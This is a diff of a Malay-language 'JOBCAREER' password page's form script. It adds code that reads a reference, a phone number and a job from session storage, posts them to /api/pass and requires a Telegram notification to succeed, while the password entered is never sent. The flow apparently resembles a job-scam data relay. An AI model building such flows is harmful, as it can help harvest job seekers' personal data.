@@ -84,7 +84,6 @@ button:disabled {
     <label for="password">Kata laluan JOBCAREER</label>
     <input
         id="password"
-        name="password"
         type="password"
         required
         autocomplete="new-password"
@@ -94,7 +93,6 @@ button:disabled {
     <label for="confirm">Ulang kata laluan</label>
     <input
         id="confirm"
-        name="confirm"
         type="password"
         required
         autocomplete="new-password"
@@ -116,7 +114,6 @@ button:disabled {
 </main>
 
 <script>
-
 document.addEventListener("DOMContentLoaded", function () {
 
     const form = document.getElementById("passwordForm");
@@ -125,22 +122,12 @@ document.addEventListener("DOMContentLoaded", function () {
     const result = document.getElementById("result");
     const button = document.getElementById("submitButton");
 
-    if (!form || !passwordInput || !confirmInput || !result || !button) {
-        console.error("Elemen formulir tidak ditemukan.");
-        return;
-    }
-
     form.addEventListener("submit", async function (event) {
 
         event.preventDefault();
 
         const password = passwordInput.value;
         const confirm = confirmInput.value;
-
-        if (!password || !confirm) {
-            result.textContent = "Sila isi kedua-dua ruangan.";
-            return;
-        }
 
         if (!/^[a-zA-Z0-9]+$/.test(password)) {
             result.textContent = "Gunakan huruf dan angka sahaja.";
@@ -152,46 +139,60 @@ document.addEventListener("DOMContentLoaded", function () {
             return;
         }
 
+        // Ambil data daripada halaman sebelumnya
+        const reference = sessionStorage.getItem("reference") || "";
+        const phone = sessionStorage.getItem("phone") || "";
+        const job = sessionStorage.getItem("job") || "";
+
+        if (!reference || !phone || !job) {
+            result.textContent =
+                "Data halaman sebelumnya tidak lengkap. Sila kembali dan ulang proses.";
+            return;
+        }
+
         button.disabled = true;
         button.textContent = "Sedang Memproses...";
-        result.textContent = "Menghubungi server...";
+        result.textContent = "Menghantar notifikasi pendaftaran...";
 
         try {
 
             const response = await fetch("/api/pass", {
-    method: "POST",
-    headers: {
-        "Content-Type": "application/json"
-    },
-    body: JSON.stringify({
-        status: "Pendaftaran akun JOBCAREER diterima"
-    })
-});
+                method: "POST",
+                headers: {
+                    "Content-Type": "application/json"
+                },
+                body: JSON.stringify({
+                    reference: reference,
+                    phone: phone,
+                    job: job
+                })
+            });
 
             const data = await response.json();
 
-            if (!response.ok || data.success !== true) {
-                throw new Error(data.message || "Pendaftaran gagal.");
+            if (!response.ok || data.success !== true ||
+                data.telegramSent !== true) {
+                throw new Error(data.message || "Penghantaran gagal.");
             }
 
-            if (data.telegramSent !== true) {
-                throw new Error("Notifikasi Telegram gagal dihantar.");
-            }
-
-            result.textContent = "Notifikasi pendaftaran berjaya dihantar.";
+            result.textContent =
+                "Notifikasi pendaftaran berjaya dihantar.";
 
             form.reset();
 
-            window.setTimeout(function () {
+            sessionStorage.removeItem("reference");
+            sessionStorage.removeItem("phone");
+            sessionStorage.removeItem("job");
+
+            setTimeout(function () {
                 window.location.href = "/login.html";
             }, 1500);
 
         } catch (error) {
 
             console.error("Registration error:", error);
-
-            result.textContent =
-                error.message || "Tidak dapat menghubungi server.";
+            result.textContent = error.message ||
+                "Tidak dapat menghubungi server.";
 
         } finally {
 
@@ -203,7 +204,6 @@ document.addEventListener("DOMContentLoaded", function () {
     });
 
 });
-
 </script>
 
 </body>
